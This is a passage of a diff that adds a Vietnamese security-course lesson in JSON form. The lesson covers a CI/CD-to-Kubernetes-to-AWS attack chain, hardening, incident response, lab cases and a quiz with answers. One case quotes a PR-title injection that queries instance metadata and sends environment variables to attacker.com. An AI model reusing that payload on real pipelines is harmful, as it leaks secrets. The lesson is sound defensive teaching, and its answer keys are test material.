+            "Bẻ Gãy Mắt Xích CI/CD: Triệt tiêu hoàn toàn vector thâm nhập ban đầu bằng cách: (1) Cấm triệt để việc sử dụng 'pull_request_target' cho các tác vụ có nạp mã nguồn từ bên ngoài; (2) Thực hiện linting toàn bộ mã workflow YAML bằng actionlint để phát hiện lỗi context injection; (3) Cấu hình GitHub Environment Protection Rules yêu cầu bắt buộc phải có sự phê duyệt thủ công (Manual Approval Gate) từ Maintainer trước khi cấp quyền chạy cho bất kỳ PR nào đến từ cộng đồng bên ngoài; (4) Siết chặt IAM Trust Policy của AWS STS: Chỉ cho phép trao đổi token khi 'sub' khớp chính xác với nhánh chính được bảo vệ ('repo:bank-corp/sdk:ref:refs/heads/main').",
+            "Bẻ Gãy Mắt Xích Kubernetes: Nếu kẻ tấn công bằng cách nào đó vẫn đánh cắp được thông tin xác thực của Role Deployer, rào chắn Kubernetes sẽ ngăn chặn không cho kẻ tấn công leo thang lên Host Node: (1) Áp dụng Kubernetes Pod Security Standards (PSS) ở cấp độ 'Restricted' trên tất cả các namespaces thông qua nhãn 'pod-security.kubernetes.io/enforce=restricted'; (2) Triển khai Admission Controller (Kyverno) với chính sách từ chối tuyệt đối các Pod có 'hostPID: true', 'hostNetwork: true', 'privileged: true' hoặc mount đường dẫn hostPath; (3) Phân quyền RBAC tối thiểu: Role của CI-Deployer chỉ được phép cập nhật Image của Deployment có sẵn ('apps/deployments/rollout'), tuyệt đối không cấp quyền tạo Pod thô ('pods/create') hay thực thi lệnh ('pods/exec').",
+            "Bẻ Gãy Mắt Xích Host Node & Cloud Control Plane: Ngay cả trong kịch bản xấu nhất khi kẻ tấn công đã giành được quyền root trên một Node máy chủ thông qua một lỗ hổng zero-day trong kernel Linux, ranh giới đám mây vẫn phải đứng vững: (1) Bắt buộc kích hoạt IMDSv2 trên toàn bộ các EC2 instances trong cụm và cấu hình tham số 'HttpPutResponseHopLimit = 1'. Với cấu hình này, gói tin IP từ container gửi tới địa chỉ 169.254.169.254 sẽ bị kernel giảm TTL xuống 0 khi đi qua network bridge và bị drop ngay lập tức, ngăn chặn 100% việc container đánh cắp metadata của máy chủ; (2) Triển khai Calico NetworkPolicy hoặc iptables rules chặn toàn bộ lưu lượng egress từ Pod tới dải địa chỉ '169.254.169.254/32'; (3) Tuân thủ nguyên tắc Least Privilege cho EKS Node Role: Node Role chỉ được cấp các quyền thiết yếu để gia nhập cụm (AmazonEKSWorkerNodePolicy, AmazonEKS_CNI_Policy, AmazonEC2ContainerRegistryReadOnly), tuyệt đối không bao giờ được cấp bất kỳ quyền hạn IAM nào liên quan đến 'iam:*' hoặc 'sts:AssumeRole'. Đồng thời áp dụng Service Control Policy (SCP) trên AWS Organizations cấm các Node Role tự ý sửa đổi chính sách IAM hoặc cấp quyền quản trị."
+          ]
+        },
+        {
+          "title": "Quy Trình Ứng Cứu Sự Cố Khẩn Cấp & Tái Thiết Lập Lòng Tin Sau Xâm Nhập Chuỗi Cung Ứng",
+          "paragraphs": [
+            "Khi một chuỗi tấn công phức hợp từ CI/CD xuyên thủng qua container và leo thang lên Cloud Control Plane thành công, doanh nghiệp phải lập tức kích hoạt Sổ tay Ứng cứu Sự cố (Incident Response Playbook) ở mức độ khẩn cấp cao nhất (Severity 1). Mục tiêu số một trong giai đoạn ngăn chặn (Containment) là cô lập tức thì các điểm thâm nhập mà không phá hủy dấu vết điều tra: Đội ngũ bảo mật phải thu hồi ngay lập tức toàn bộ phiên IAM STS tạm thời đã phát sinh từ GitHub OIDC bằng chính sách từ chối có điều kiện thời gian, vô hiệu hóa hoặc thu hồi quyền truy cập của IAM Role bị thỏa hiệp, đồng thời tạm ngưng tất cả các workflow GitHub Actions có nguy cơ bị tiêm mã độc.",
+            "Đối với các máy chủ hoặc pod runner bị chiếm quyền điều khiển (Runner Compromise), quy trình ứng cứu đòi hỏi phải ngắt kết nối mạng khẩn cấp (Network Isolation) để ngăn chặn kẻ tấn công thực hiện quét mạng nội bộ hoặc phát tán mã độc sang các hệ thống lân cận. Trước khi xóa bỏ hoặc tái tạo runner instance, đội ngũ điều tra số pháp y (Digital Forensics) bắt buộc phải thực hiện trích xuất bộ nhớ RAM (Memory Dump) và tạo bản sao đĩa (Disk Snapshot). Dữ liệu pháp y này là chìa khóa để trích xuất payload độc hại, phân tích tiến trình đào bới secrets và xác định chính xác danh sách các khóa API hoặc credentials đã bị kẻ tấn công đánh cắp.",
+            "Giai đoạn khắc phục và tái thiết lập lòng tin (Eradication & Trust Restoration) đòi hỏi một chiến lược làm sạch toàn diện và có hệ thống. Toàn bộ các chứng chỉ xác thực OIDC, GitHub Secrets, API keys và chứng thư triển khai trên toàn bộ tổ chức phải được xoay vòng triệt để (Complete Credential Rotation). Quan trọng hơn cả, mọi container base images và artifacts được tạo ra trong khoảng thời gian diễn ra sự cố đều phải bị coi là đã nhiễm độc (poisoned). Doanh nghiệp phải tái thiết lập môi trường build sạch, độc lập và cách ly (Clean Isolated Build Environment), kiểm toán lại toàn bộ mã nguồn tại các commit đã được xác thực, và thực hiện biên dịch lại 100% container base images từ các nguồn sạch đã kiểm định trước khi ký số lại bằng Sigstore và cấp phép tái triển khai lên hạ tầng sản xuất."
+          ]
+        }
+      ],
+      "lab": {
+        "title": "Bài Tập Capstone: Tác Chiến Đa Tầng, Phân Tích Dấu Vết Sự Cố & Gia Cố Toàn Diện Từ Pipeline Tới Cloud Control Plane",
+        "objective": "Phân tích dữ liệu telemetry đa nguồn, nhận diện toàn bộ chuỗi tấn công liên hoàn (End-to-End Kill Chain) và đưa ra các quyết định khắc phục triệt để trên cả 4 tầng: CI/CD, Container Runtime, Kubernetes RBAC và Cloud IAM.",
+        "scenario": "Một kỳ lân công nghệ tài chính vừa hứng chịu một cuộc tấn công thâm nhập mạng nghiêm trọng. Trung tâm SOC ghi nhận chuỗi cảnh báo rời rạc: một PR lạ trên GitHub Enterprise, một Pod khả nghi chạy trong namespace production của cụm EKS, các kết nối bất thường tới IP IMDS 169.254.169.254, và một chính sách AdministratorAccess bất ngờ được gán cho NodeInstanceRole trong CloudTrail. Bạn được cử làm Chỉ huy Trưởng Đội Điều Tra Sự Cố (Incident Commander) để giải mã toàn bộ sự việc và bẻ gãy mọi mắt xích tấn công.",
+        "constraints": [
+          "Tuyệt đối tuân thủ ADR-001: Mọi quyết định ứng cứu và hardening phải dựa trên các cơ chế kỹ thuật thực tế của GitHub Actions, Kubernetes RBAC/PSS, eBPF Falco và AWS IAM/IMDSv2, không sử dụng giả lập.",
+          "Phải khoanh vùng và ngăn chặn sự cố ngay lập tức mà không làm sập các dịch vụ thanh toán đang hoạt động bình thường trên các Node khác trong cụm.",
+          "Giải pháp tái cấu trúc phòng thủ phải đáp ứng tiêu chuẩn khắt khe nhất của NIST SP 800-204D, CIS AWS Foundations Benchmark v3.0 và NSA/CISA Kubernetes Hardening Guide."
+        ],
+        "cases": [
+          {
+            "id": "case-90-01",
+            "title": "Truy Vết & Bẻ Gãy Mắt Xích Đầu Tiên: Ngăn Chặn OIDC Token Abuse & Kubernetes Pivoting",
+            "context": "Trong quá trình điều tra ban đầu, bạn phát hiện attacker đã mở một PR trên repo open-source 'payment-sdk' chứa tiêu đề: 'Fix typo\"; curl http://169.254.169.254/latest/meta-data/ || true; env | base64 | curl -d @- attacker.com; echo \"'. Workflow 'ci-test.yml' sử dụng pull_request_target đã kích hoạt và cấp token OIDC cho attacker để assume vai trò 'EKS-Deployer-Role' trên AWS.",
+            "prompt": "Hành động khắc phục khẩn cấp và căn cơ nào sau đây loại bỏ hoàn toàn khả năng attacker tiếp tục sử dụng kênh này để thâm nhập vào cụm Kubernetes?",
+            "options": [
+              {
+                "id": "A",
+                "label": "Gửi tin nhắn cảnh cáo tới tài khoản GitHub của attacker và đóng Pull Request đó lại.",
+                "correct": false,
+                "rationale": "Hành động mang tính đối phó vô hiệu; attacker có thể mở PR mới từ tài khoản khác hoặc tiếp tục dùng session token đã đánh cắp trước đó."
+              },
+              {
+                "id": "B",
+                "label": "Ngay lập tức thu hồi toàn bộ phiên làm việc AWS STS hiện hành của vai trò 'EKS-Deployer-Role' bằng cách đính kèm chính sách từ chối 'aws:CurrentTime < [Timestamp]'; sửa đổi Trust Policy của Role trên AWS để ràng buộc chặt chẽ Subject claim 'repo:bank-corp/payment-sdk:ref:refs/heads/main'; đồng thời viết lại workflow chuyển sang trigger 'pull_request' an toàn và loại bỏ biểu thức nội suy thô trong shell scripts.",
+                "correct": true,
+                "rationale": "Biện pháp này bẻ gãy ngay lập tức phiên truy cập đang hoạt động của attacker trên đám mây, triệt tiêu lỗ hổng Trust Policy lỏng lẻo và loại bỏ vĩnh viễn vector tiêm mã context injection trong workflow."
+              },
+              {
+                "id": "C",
+                "label": "Chỉ cần thay đổi tên cụm EKS từ 'prod-cluster' sang 'prod-cluster-new' trên AWS Console.",
+                "correct": false,
+                "rationale": "Attacker có quyền AWS STS vẫn có thể gọi lệnh 'aws eks list-clusters' để tìm ra tên cụm mới chỉ trong vài giây."
+              },
+              {
+                "id": "D",
+                "label": "Khởi động lại toàn bộ máy chủ GitHub Enterprise Server.",
+                "correct": false,
+                "rationale": "Khởi động lại server không sửa được lỗi logic trong workflow YAML và không thu hồi được token AWS STS đang nằm trong tay attacker."
+              }
+            ]
+          },
+          {
+            "id": "case-90-02",
+            "title": "Khoanh Vùng Dấu Vết Host Node Breakout & Ngăn Chặn Đánh Cắp IMDS Credentials",
+            "context": "Nhật ký Falco trên Worker Node 'ip-10-0-3-42' hiển thị cảnh báo: 'Chroot operation detected from container debug-pod-xyz' và Kube-apiserver ghi nhận Pod này được tạo với 'hostPID: true', 'volumes: [hostPath: /]'. Kẻ tấn công đang ở trên shell của node và chuẩn bị trích xuất IAM credentials từ địa chỉ 169.254.169.254.",
+            "prompt": "Phương án can thiệp tức thời nào sau đây cô lập node bị tổn thương, ngăn chặn việc đánh cắp Node IAM Role và tiêu hủy Pod độc hại một cách an toàn?",
+            "options": [
+              {
+                "id": "A",
+                "label": "Chạy lệnh 'kubectl delete pod debug-pod-xyz --force' và coi như sự cố đã được xử lý xong.",
+                "correct": false,
+                "rationale": "Xóa Pod khi attacker đã chroot ra host node là vô ích; tiến trình độc hại của attacker vẫn đang chạy trực tiếp trên hệ điều hành của node worker."
+              },
+              {
+                "id": "B",
+                "label": "Thực hiện 'kubectl cordon' và 'kubectl drain' node bị xâm nhập (chuyển các workload lành mạnh sang node khác); cô lập ngay lập tức Worker Node 'ip-10-0-3-42' ở tầng hạ tầng mạng bằng cách gắn Security Group cô lập (chặn toàn bộ Ingress/Egress ngoại trừ cổng điều tra forensics); và trên toàn bộ AutoScaling Group của Worker Nodes, thực thi cấu hình bắt buộc IMDSv2 với 'HttpPutResponseHopLimit = 1' bằng AWS CLI.",
+                "correct": true,
+                "rationale": "Cordon/Drain bảo vệ các ứng dụng khác; cô lập mạng chặn attacker kết nối C2; cấu hình IMDSv2 Hop Limit = 1 triệt tiêu hoàn toàn khả năng các Pod trong tương lai có thể truy cập metadata của máy chủ chủ."
+              },
+              {
+                "id": "C",
+                "label": "Cắt nguồn điện của toàn bộ trung tâm dữ liệu AWS Region.",
+                "correct": false,
+                "rationale": "Phản ứng thái quá, gây gián đoạn dịch vụ diện rộng vi phạm nghiêm trọng thỏa thuận SLA và không khả thi trên hạ tầng public cloud."
+              },
+              {
+                "id": "D",
+                "label": "Tải phần mềm diệt virus Antivirus chạy quét toàn bộ ổ cứng của Worker Node.",
+                "correct": false,
+                "rationale": "Quét antivirus truyền thống không ngăn chặn được các tiến trình shell đang chạy, không chặn được lưu lượng mạng ra ngoài và làm ô nhiễm dấu vết số pháp y (Forensics Integrity)."
+              }
+            ]
+          },
+          {
+            "id": "case-90-03",
+            "title": "Tái Cấu Trúc Toàn Diện Kiến Trúc Bảo Mật Zero-Trust Từ Pipeline Đến Cloud Control Plane",
+            "context": "Sau khi dập tắt cuộc tấn công, bạn chủ trì cuộc họp Post-Mortem với Ban Lãnh đạo và các đội ngũ DevOps, Cloud Platform, AppSec. Nhiệm vụ là ban hành một Kiến Trúc Phòng Thủ Toàn Diện (Zero-Trust Defense Architecture) bảo đảm loại sự cố liên hoàn này vĩnh viễn không thể tái diễn.",
+            "prompt": "Tập hợp các giải pháp kiến trúc nào sau đây thiết lập hệ thống phòng thủ có chiều sâu toàn diện và triệt để nhất trên cả 4 tầng?",
+            "options": [
+              {
+                "id": "A",
+                "label": "Chỉ cần cài đặt thêm một phần mềm Web Application Firewall (WAF) ở cổng Internet của công ty.",
+                "correct": false,
+                "rationale": "WAF chỉ kiểm tra lưu lượng HTTP/HTTPS vào ứng dụng web, hoàn toàn vô dụng trước các cuộc tấn công qua GitHub Actions, Kubernetes API và Cloud IAM Control Plane."
+              },
+              {
+                "id": "B",
+                "label": "Yêu cầu tất cả lập trình viên đổi mật khẩu tài khoản mỗi 15 ngày và cấm sử dụng mã nguồn mở.",
+                "correct": false,
+                "rationale": "Chính sách lạc hậu không giải quyết nguyên nhân gốc rễ là cấu hình phân quyền sai lệch và thiếu hụt cơ chế cô lập trong hệ thống tự động hóa."
+              },
+              {
+                "id": "C",
+                "label": "Thiết lập hệ thống phòng thủ đa tầng: (1) Tầng CI/CD: Cấm pull_request_target với untrusted checkouts, bắt buộc manual review cho PR ngoài, siết chặt OIDC sub claim; (2) Tầng Chuỗi Cung Ứng: Ký số Sigstore Keyless, sinh SBOM và kiểm tra Provenance; (3) Tầng Kubernetes: Áp dụng Pod Security Standards 'Restricted', cấm hostPath/hostPID/privileged qua Kyverno, siết RBAC chỉ cho phép rollout deployment; (4) Tầng Cloud: IMDSv2 Hop Limit = 1, tước bỏ toàn bộ quyền IAM dư thừa trên Node Role, và ban hành Service Control Policy (SCP) cấm Worker Nodes tự sửa đổi chính sách IAM.",
+                "correct": true,
+                "rationale": "Đây là chiến lược phòng ngự có chiều sâu kiểu mẫu (Golden Standard): mỗi tầng kiến trúc đều có chốt chặn độc lập, bẻ gãy mọi mắt xích trong Kill Chain ngay cả khi các tầng khác bị xuyên thủng."
+              },
+              {
+                "id": "D",
+                "label": "Xóa bỏ toàn bộ cụm Kubernetes và chuyển tất cả ứng dụng về chạy trên các máy chủ vật lý Bare-Metal đơn lẻ.",
+                "correct": false,
+                "rationale": "Thay đổi thụt lùi về công nghệ, phá vỡ khả năng mở rộng của doanh nghiệp và máy chủ Bare-Metal vẫn phải đối mặt với các nguy cơ tấn công CI/CD và chuỗi cung ứng."
+              }
+            ]
+          }
+        ],
+        "successCriteria": [
+          "Giải mã và mô tả chính xác toàn bộ 4 giai đoạn của chuỗi tấn công End-to-End từ CI/CD injection đến Cloud Control Plane takeover.",
+          "Thực hiện thành công quy trình ứng cứu sự cố khẩn cấp: thu hồi AWS STS session, cô lập worker node và siết chặt IMDSv2 hop limit.",
+          "Xây dựng hoàn chỉnh tài liệu kiến trúc phòng thủ chuyên sâu đa tầng (Defense-in-Depth) đáp ứng đầy đủ các tiêu chuẩn NIST SP 800-204D và CIS Benchmarks."
+        ],
+        "evidenceTemplate": [
+          "Sơ đồ chuỗi tấn công Kill Chain toàn diện (Diagram/Timeline) thể hiện các chỉ số thỏa hiệp IOC và dấu vết telemetry tương ứng",
+          "Tập lệnh KQL/Sigma phát hiện chuỗi hành vi bất thường từ sự kiện AssumeRoleWithWebIdentity đến AttachRolePolicy",
+          "Tệp cấu hình chính sách Kyverno ClusterPolicy cưỡng chế PSS Restricted và ngăn chặn truy cập host namespace",
+          "Bản kiểm toán kiến trúc AWS IAM SCP và EKS Node Instance Profile sau khi đã triệt tiêu toàn bộ quyền phân quyền dư thừa"
+        ],
+        "reset": "Khôi phục cụm EKS, các vai trò IAM và chính sách Kyverno về trạng thái tiêu chuẩn an toàn của môi trường diễn tập Purple Team.",
+        "cleanup": "Xóa bỏ toàn bộ các worker nodes bị cô lập, thu hồi vĩnh viễn các test credentials và xóa các tệp logs phát sinh trong quá trình diễn tập."
+      },
+      "governance": {
+        "prevent": [
+          "Ban hành Service Control Policy (SCP) ở cấp độ AWS Organization cấm tuyệt đối các IAM Roles của hạ tầng điện toán (EC2 Instances, Lambda, EKS Nodes) thực thi các API thao tác quyền lực như 'iam:Attach*', 'iam:Put*', 'iam:CreateAccessKey'.",
+          "Cưỡng chế chính sách Pod Security Standards ở cấp độ 'Restricted' trên 100% namespaces trong cụm Kubernetes bằng Admission Controller, tự động chặn đứng mọi cấu hình privileged, hostPID, hostNetwork và hostPath.",
+          "Bắt buộc toàn bộ các phiên bản máy chủ EC2 phải kích hoạt IMDSv2 với cấu hình 'HttpPutResponseHopLimit = 1' ngay từ template khởi tạo AutoScaling Group."
+        ],
+        "observe": [
+          "Thiết lập quy tắc tương quan SIEM thời gian thực: Cảnh báo đỏ ngay lập tức khi phát hiện một EKS Node IP thực hiện các lệnh gọi API quản trị IAM trên AWS CloudTrail.",
+          "Triển khai eBPF Falco / Tetragon trên toàn bộ các node máy chủ để giám sát các hành vi thoát vùng chứa (chroot, mount cgroup, mở /proc/kcore) và các kết nối tới IP metadata 169.254.169.254.",
+          "Thu thập và phân tích tập trung Kube-apiserver Audit Logs đối với mọi hành vi tạo Pod chứa cấu hình vi phạm chính sách an toàn."
+        ],
+        "respond": [
+          "Kích hoạt quy trình Phản Ứng Sự Cố Khẩn Cấp Cấp Độ 1 (Sev-1): Tự động cô lập Worker Node bị nghi ngờ bằng Security Group cách ly và thu hồi toàn bộ phiên STS của Node Role.",
+          "Tiến hành Cordon và Drain đối với node bị xâm nhập, trích xuất bản sao bộ nhớ RAM (Memory Dump) của máy chủ trước khi chấm dứt instance để phục vụ điều tra số pháp y.",
+          "Kiểm toán toàn diện toàn bộ tài khoản AWS để rà soát các backdoor có thể đã bị tạo ra (như IAM Users mới, Access Keys phụ, Security Group rules lạ, snapshots bị chia sẻ ra ngoài)."
+        ],
+        "residualRisk": [
+          "Nguy cơ từ các cuộc tấn công Zero-day trong phần mềm ảo hóa của nhà cung cấp dịch vụ đám mây (Cloud Hypervisor Breakout) vượt ra ngoài tầm kiểm soát của khách hàng.",
+          "Rủi ro gián đoạn hoạt động sản xuất khi áp dụng các chính sách bảo mật quá nghiêm ngặt đột ngột mà không có giai đoạn kiểm thử tương thích kỹ lưỡng."
+        ]
+      },
+      "misconceptions": [
+        {
+          "claim": "Chỉ cần bảo vệ thật tốt tài khoản Root của tài khoản AWS (bật MFA, khóa Access Keys) là kẻ tấn công không thể chiếm quyền kiểm soát đám mây.",
+          "correction": "Sai lầm nguy hiểm. Trong thực tế, kẻ tấn công hiếm khi tấn công trực diện vào tài khoản root. Chúng thường thâm nhập qua các ứng dụng biên hoặc đường ống CI/CD, sau đó leo thang từng bước qua các IAM Roles có cấu hình phân quyền lỏng lẻo của các dịch vụ nội bộ (như EC2/EKS Node Roles) để đạt được quyền AdministratorAccess tương đương root."
+        },
+        {
+          "claim": "Môi trường Kubernetes chạy trên dịch vụ quản trị đám mây (Managed Kubernetes như AWS EKS, GCP GKE) là an toàn mặc định và người dùng không cần lo lắng về việc bảo vệ máy chủ Worker Nodes.",
+          "correction": "Hoàn toàn sai lầm. Mô hình Trách nhiệm Chia sẻ (Shared Responsibility Model) của điện toán đám mây quy định nhà cung cấp chỉ chịu trách nhiệm bảo vệ Control Plane (kube-apiserver, etcd). Người dùng hoàn toàn chịu trách nhiệm bảo vệ Worker Nodes, cấu hình an toàn cho Pods, phân quyền RBAC và kiểm soát truy cập IMDS/IAM của các workloads."
+        },
+        {
+          "claim": "Khi phát hiện một Pod hoặc container bị thỏa hiệp trong cụm Kubernetes, biện pháp ứng cứu tốt nhất là lập tức xóa (kubectl delete) Pod đó để hệ thống tự khởi tạo lại trạng thái ban đầu.",
+          "correction": "Hành động xóa Pod lập tức sẽ phá hủy toàn bộ bằng chứng số pháp y trong bộ nhớ tạm (volatile memory) và tiến trình đang chạy cần thiết để điều tra nguyên nhân gốc rễ (Root Cause Analysis). Hơn nữa, nếu kẻ tấn công đã kịp thoát vùng chứa lên worker node, đánh cắp OIDC/IMDS credentials hoặc cấy backdoor ở tầng cluster (như Mutating Webhook hay DaemonSet), Pod mới khởi tạo sẽ nhanh chóng bị tái thỏa hiệp. Quy trình chuẩn đòi hỏi phải cô lập mạng (network isolation), thu thập memory/disk snapshot, thu hồi credentials trước khi tiêu hủy workload."
+        }
+      ],
+      "quiz": [
+        {
+          "id": "os09-l90-q1",
+          "difficulty": "easy",
+          "question": "Trong một chuỗi tấn công đa tầng từ CI/CD đến Cloud Control Plane, tại sao việc cấu hình 'HttpPutResponseHopLimit = 1' trên dịch vụ AWS IMDSv2 lại ngăn chặn được việc container trong Pod đánh cắp credentials của máy chủ EC2?",
+          "options": [
+            {
+              "id": "A",
+              "label": "Vì tham số này sẽ mã hóa toàn bộ dữ liệu metadata bằng mật khẩu của người quản trị."
+            },
+            {
+              "id": "B",
+              "label": "Vì khi container gửi gói tin IP tới địa chỉ 169.254.169.254, gói tin phải đi qua ít nhất 2 bước nhảy mạng (hops): từ container network namespace qua network bridge/veth tới host; với Hop Limit = 1 (IP Time-to-Live = 1), gói tin sẽ bị giảm TTL về 0 và bị kernel loại bỏ ngay trước khi tới được IMDS."
+            },
+            {
+              "id": "C",
+              "label": "Vì tham số này sẽ tắt hoàn toàn dịch vụ IMDS trên máy chủ EC2."
+            },
+            {
+              "id": "D",
+              "label": "Vì nó yêu cầu container phải nhập mã OTP trước khi gọi lệnh curl."
+            }
+          ],
+          "correctAnswer": "B",
+          "explanation": "Trong kiến trúc mạng Linux container, gói tin xuất phát từ Pod phải đi qua veth pair và bridge của host (tốn ít nhất 1 hop). Khi cấu hình Hop Limit = 1, chỉ các tiến trình chạy trực tiếp trong host network namespace mới có thể tiếp cận IMDS (0 hops), còn gói tin từ container sẽ bị hết hạn TTL và bị drop, triệt tiêu nguy cơ trích xuất metadata từ pod."
+        },
+        {
+          "id": "os09-l90-q2",
+          "difficulty": "medium",
+          "question": "Khi phân tích nhật ký AWS CloudTrail để phát hiện hành vi xâm nhập bắt nguồn từ việc lạm dụng OIDC Federation của GitHub Actions, trường thông tin nào trong bản ghi sự kiện 'AssumeRoleWithWebIdentity' cung cấp bằng chứng rõ ràng nhất về kho chứa và ngữ cảnh workflow đã kích hoạt yêu cầu?",
+          "options": [
+            {
+              "id": "A",
+              "label": "recipientAccountId"
+            },
+            {
+              "id": "B",
+              "label": "Trường 'serviceProvider' và 'requestParameters.roleArn'"
+            },
+            {
+              "id": "C",
+              "label": "Trường 'userIdentity.sessionContext.webIdentityFederationData.attributes' (chứa Subject Claim 'sub', Repo Name, và Git Ref được trích xuất từ JWT do GitHub ký)"
+            },
+            {
+              "id": "D",
+              "label": "Kích thước của gói tin HTTP POST (requestSize)"
+            }
+          ],
+          "correctAnswer": "C",
+          "explanation": "Trong sự kiện CloudTrail 'AssumeRoleWithWebIdentity', khối 'webIdentityFederationData.attributes' phản ánh toàn bộ các claims cốt lõi của token OIDC, bao gồm URL repo ('token.actions.githubusercontent.com:sub'), branch/tag, workflow path và danh tính người kích hoạt, cho phép xác định chính xác nguồn gốc của yêu cầu mạo danh."
+        },
+        {
+          "id": "os09-l90-q3",
+          "difficulty": "hard",
+          "question": "Giả sử một kẻ tấn công đã chiếm được quyền root trên một Kubernetes Worker Node vật lý trong cụm AWS EKS. Biện pháp kiến trúc phòng thủ nào sau đây ngăn chặn hiệu quả nhất việc kẻ tấn công sử dụng quyền của Node để leo thang sang các tài nguyên đám mây nhạy cảm không thuộc phạm vi của node đó?",
+          "options": [
+            {
+              "id": "A",
+              "label": "Cài đặt mật khẩu BIOS phức tạp cho máy chủ vật lý của node."
+            },
+            {
+              "id": "B",
+              "label": "Áp dụng Service Control Policy (SCP) cấm Worker Node Roles thực hiện bất kỳ hành vi quản trị IAM nào; đồng thời tuân thủ nguyên tắc Least Privilege tuyệt đối bằng cách chỉ cấp quyền gia nhập EKS tối thiểu cho Node Role, và chuyển toàn bộ việc cấp quyền ứng dụng sang mô hình IAM Roles for Service Accounts (IRSA / EKS Pod Identity) với ranh giới phân quyền độc lập cho từng Pod."
+            },
+            {
+              "id": "C",
+              "label": "Chỉ cho phép Worker Node chạy tối đa 3 Pods cùng một lúc."
+            },
+            {
+              "id": "D",
+              "label": "Sử dụng giao thức DNS over HTTPS cho các yêu cầu phân giải tên miền trong cụm."
+            }
+          ],
+          "correctAnswer": "B",
+          "explanation": "Bằng cách tước bỏ toàn bộ quyền hạn IAM mở rộng khỏi Node Instance Role (chỉ giữ quyền hạ tầng EKS thiết yếu), áp dụng SCP ngăn chặn leo thang quyền IAM, và sử dụng IRSA/Pod Identity cho ứng dụng, kẻ tấn công dù có kiểm soát toàn bộ host node cũng không thể lấy được quyền quản trị đám mây hay truy cập dữ liệu của các ứng dụng khác."
+        }
+      ],
+      "transferChallenge": {
+        "scenario": "Bạn được ban giám đốc một ngân hàng số giao quyền tổng chỉ huy một chiến dịch Purple Team toàn diện: Mô phỏng lại một cuộc tấn công thâm nhập mạng End-to-End từ lỗ hổng CI/CD workflow trên GitHub, đánh cắp OIDC credentials, xâm nhập EKS cluster, breakout node và cố gắng chiếm Cloud Control Plane; song song với việc kiểm chứng năng lực phát hiện của hệ thống SOC và hoàn thiện tài liệu kiến trúc gia cố Zero-Trust cho toàn bộ hạ tầng đám mây của ngân hàng.",
+        "tasks": [
+          "Xây dựng kịch bản diễn tập và ma trận kỹ thuật (Attack Matrix) ánh xạ đầy đủ 4 giai đoạn tấn công theo khung MITRE ATT&CK (Cloud & Container Matrices).",
+          "Thiết kế bộ quy tắc phát hiện tương quan (Correlated Detection Rules) trên SIEM/KQL kết nối dữ liệu từ GitHub Audit, CloudTrail, Kube-Audit và Falco eBPF để phát hiện chuỗi tấn công trong thời gian dưới 5 phút.",
+          "Biên soạn Bản Khuyến Nghị Kiến Trúc Phòng Thủ Toàn Diện (Comprehensive Hardening Blueprint) bao gồm các chính sách Kyverno, IAM SCPs, PSS Restricted, và IMDSv2 configuration áp dụng cho toàn bộ tổ chức."
+        ],
+        "requiredEvidence": [
+          "Bản đồ ma trận diễn tập Purple Team (Matrix) ánh xạ kỹ thuật tấn công, bằng chứng telemetry thu được và thời gian phát hiện (MTTD)",
+          "Bộ tệp Sigma Rules / KQL Queries phát hiện chuỗi tấn công liên hoàn từ OIDC token exchange đến hành vi IAM privilege escalation",
+          "Tài liệu kiến trúc phòng thủ chuyên sâu (Hardening Blueprint) kèm toàn bộ các tệp manifest cấu hình mẫu (Kyverno, IAM SCPs, Terraform IMDSv2)"
+        ]
+      },
+      "sources": [
+        {
+          "title": "MITRE ATT&CK Matrix for Enterprise — Cloud and Container Technologies",
+          "url": "https://attack.mitre.org/matrices/enterprise/cloud/",
+          "publisher": "MITRE Corporation",
+          "sourceType": "official-standard",
+          "accessedAt": "2026-09-04",
+          "supports": [
+            "Mô hình hóa chuỗi tấn công đa tầng từ Cloud sang Container",
+            "Kỹ thuật T1611 (Escape to Host), T1078 (Valid Accounts), T1556 (Modify Authentication Process)"
+          ]
+        },
+        {
+          "title": "CISA & NSA — Kubernetes Hardening Guidance (Technical Report)",
+          "url": "https://www.cisa.gov/resources-reference/resources/kubernetes-hardening-guidance",
+          "publisher": "Cybersecurity and Infrastructure Security Agency (CISA) & NSA",
+          "sourceType": "official-guidance",
+          "accessedAt": "2026-09-04",
+          "supports": [
+            "Thực hành tốt nhất về Pod Security Standards và Admission Controllers",
+            "Cô lập hạ tầng mạng máy chủ và bảo vệ Instance Metadata Service (IMDS)"
+          ]
+        },
+        {
+          "title": "AWS Security Best Practices — Securing the Software Supply Chain and EKS Workloads",
+          "url": "https://docs.aws.amazon.com/whitepapers/latest/practical-aws-security-guidance/practical-aws-security-guidance.html",
+          "publisher": "Amazon Web Services (AWS)",
+          "sourceType": "official-guidance",
+          "accessedAt": "2026-09-04",
+          "supports": [
+            "Cấu hình IAM OIDC Identity Providers và Service Control Policies (SCPs)",
+            "Gia cố bảo mật Amazon EKS và bắt buộc sử dụng IMDSv2 Hop Limit = 1"
+          ]
+        },
+        {
+          "title": "NIST SP 800-204C — Implementation of DevSecOps for a Multi-Cluster Kubernetes Environment",
+          "url": "https://csrc.nist.gov/pubs/sp/800/204/c/final",
+          "publisher": "National Institute of Standards and Technology (NIST)",
+          "sourceType": "official-standard",
+          "accessedAt": "2026-09-04",
+          "supports": [
+            "Khung kiến trúc bảo mật đa tầng cho hạ tầng Cloud-Native",
+            "Kiểm soát truy cập Zero-Trust từ đường ống build đến cụm điều khiển"
+          ]
+        }
+      ]
+    }
+  ]
+}
